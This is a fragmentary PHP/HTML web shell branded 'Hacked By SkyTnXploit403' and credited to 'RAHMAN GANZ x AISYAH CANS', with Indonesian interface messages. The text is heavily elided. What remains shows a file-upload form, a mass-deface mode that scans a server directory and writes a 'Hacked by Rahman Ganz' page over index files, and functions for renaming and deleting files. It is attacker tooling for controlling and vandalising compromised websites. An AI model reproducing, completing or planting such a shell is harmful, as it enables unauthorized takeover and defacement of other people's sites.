...
?>
<title>Hacked By SkyTnXploit403</title>
<link rel="icon" href="https://i1.sndcdn.com/artworks-Y4RmG2pmfpqOMiQg-VbdYhw-t500x500.jpg"><meta name="theme-color" content="black"> </meta> <!--Buat Thumbnail website--> 
...
<form enctype="multipart/form-data" method="post">
  <td align="center">
     <center><p class="blink_text" style="font-size:50px;color:lime;text-shadow: 0px 0px 20px #00ffff , 0px 0px 20px #DF0101;font-family:Kelly Slab;">&lt;/&gt;  RAHMAN GANZ x AISYAH CANS &lt/&gt; </font></center>
          <br>      
...
<h1><font class="Skranji" style="color:white;font-family:'Kelly Slab';font-size: 15px;">Copyright &copy; 2K20 <font color="lime">RAHMAN GANZ</h1>
      <br>
...
<html>
<head>
<link rel="icon" type="image/gif" href="https://i1.sndcdn.com/artworks-Y4RmG2pmfpqOMiQg-VbdYhw-t500x500.jpg"><br>
<link href="" rel="stylesheet" type="text/css">
<title>Hacked By SkyTnXploit403</title><link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css"> 
<link href="/style.css" rel="stylesheet" type="text/css">
<center><p class="blink_text" style="font-size:50px;color:lime;text-shadow: 0px 0px 20px #000 , 0px 0px 20px #000;font-family:Kelly Slab;">&lt;/&gt; RAHMAN X AISYAH SHELL  &lt;/&gt; </font></center>
<style>
body{
...
echo '<font color="lime"> Berhasil upload </font><br />';
}else{
...
if ($_GET['to'] == "mass") {
        if (isset($_POST['base_dir'])) {
            ...
            $files = @scandir($_POST['base_dir']) or die("Terjadi kesalahan<br>");
    ...
    <input cols='7' rows='7' type='text' style='color:lime;background-color:#191919;font-family:kelly slab' name='base_dir' value='" . getcwd() . "'><br><br>";
        ...
        echo "<font color='white'>Script Deface</font><br><textarea cols='25' rows='8' style='color:lime;background-color:#191919;font-family:kelly slab' name='index'>Hacked by Rahman Ganz</textarea><br>";
...
echo '<font color="lime">Sukses ganti nama</font><br/>';
}else{
echo '<font color="red">Gagal ganti nama </font><br />';
}
...
echo '<font color="lime">Berhasil hapus file</font><br/>';
}else{
...
echo '<font face="Kelly Slab" color="white" size="2px"><center><br/><b>Copyright &copy; 2K20 <font color="lime">RAHMAN GANZ X AISYAH CANS</a></center></font>
